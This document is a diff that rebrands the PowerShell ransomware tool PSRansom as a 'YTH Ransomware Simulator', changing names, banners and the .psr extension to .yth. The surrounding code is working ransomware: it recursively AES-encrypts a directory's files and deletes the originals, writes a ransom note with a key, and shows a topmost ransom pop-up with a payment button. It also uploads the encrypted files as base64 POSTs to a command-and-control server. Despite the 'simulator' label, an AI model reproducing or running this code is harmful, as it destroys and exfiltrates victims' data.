@@ -1,27 +1,25 @@
-﻿#================================#
-#     PSRansom by @JoelGMSec     #
-#      https://darkbyte.net      #
-#================================#
-
 # Design
 $ProgressPreference = "SilentlyContinue"
 $ErrorActionPreference = "SilentlyContinue"
 $OSVersion = [Environment]::OSVersion.Platform
 if ($OSVersion -like "*Win*") {
-$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec" 
+$Host.UI.RawUI.WindowTitle = "YTH Ransomware Simulator - by @PhyoPaingHtun" 
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "White" }
 
 # Banner
 function Show-Banner {
-   Write-Host 
-   Write-Host "  ____  ____  ____                                  " -ForegroundColor Blue
-   Write-Host " |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
-   Write-Host " | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \  " -ForegroundColor Blue
-   Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
-   Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
-   Write-Host                                                            
-   Write-Host "  ----------------- by @JoelGMSec ----------------  " -ForegroundColor Green }
+   Write-Host
+   Write-Host " __     __ _______ _    _  _____   ____   ____   " -ForegroundColor Blue
+   Write-Host " \ \   / /__   __| |  | |/ ____| / __ \ / __ \  " -ForegroundColor Blue
+   Write-Host "  \ \_/ /   | |  | |__| | (___  | |  | | |  | | " -ForegroundColor Blue
+   Write-Host "   \   /    | |  |  __  | \___ \ | |  | | |  | | " -ForegroundColor Blue
+   Write-Host "    | |     | |  | |  | | ____) || |__| | |__| | " -ForegroundColor Blue
+   Write-Host "    |_|     |_|  |_|  |_|_____/  \____/ \____/  " -ForegroundColor Blue
+   Write-Host
+   Write-Host "  -------------------- YTHSOC Simulator --------------------" -ForegroundColor Green
+}
+
 
 # Help
 function Show-Help {
@@ -98,7 +96,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName + ".psr" }
+                $outPath = $File.FullName + ".yth" }
 
              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
@@ -117,7 +115,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName.replace(".psr","") }
+                $outPath = $File.FullName.replace(".yth","") }
 
              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
@@ -174,8 +172,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
-Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
-Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
+Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/RansomwareSimulator/tree/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
+Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/RansomwareSimulator/tree/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
@@ -188,7 +186,7 @@ $form.StartPosition = "CenterScreen"
 $form.WindowState = "Normal"
 $form.Topmost = $true
 $form.FormBorderStyle = "Fixed3D"
-$form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom"
+$form.Text = "PSRansom by @PhyoPaingHtun - https://github.com/PhyoPaingHtun/RansomwareSimulator"
 $formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
 $form.Icon = $formicon  
 
@@ -202,7 +200,7 @@ $form.controls.add($pictureBox)
 
 $label = New-Object System.Windows.Forms.Label
 $label.ForeColor = "Cyan"
-$label.Text = "All your files have been encrypted by PSRansom!" 
+$label.Text = "All your files have been encrypted by YTH Ransomware Simulator!" 
 $label.AutoSize = $true 
 $label.Location = New-Object System.Drawing.Size(50,400) 
 $font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
@@ -229,7 +227,7 @@ $okbutton.Visible = $false
 $okbutton.Enabled = $true
 $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
 $okButton.add_Click({ 
-[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'PSRansom Payment System',
+[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'Ransomware Payment System',
 [Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
 $form.AcceptButton = $okButton
 $form.Controls.Add($okButton)
@@ -287,12 +285,12 @@ function SendOK {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
 
 function CreateReadme {
-   $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
+   $ReadmeTXT = "All your files have been encrypted by YTH Ransomware Simulator!`nBut don't worry, you can still recover them with the recovery key :)`n"
    if (!(Test-Path "$Directory$slash$Readme")) { Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
    Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }}
 
 function EncryptFiles { 
-   $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
+   $ExcludedFiles = '*.yth', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
    Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$RansomLogs) { 
@@ -301,18 +299,18 @@ function EncryptFiles {
 function ExfiltrateFiles {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
-   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.yth | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
       $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
       Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
    else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
 
 function DecryptFiles {
-   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
-      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.yth | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".yth","")
       Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }
 
 function CheckFiles { 
-   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
+   $RFiles = Get-ChildItem $Directory -recurse -filter *.yth ; if ($RFiles) { $RFiles | Remove-Item } else {
    Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}
 
 # Main
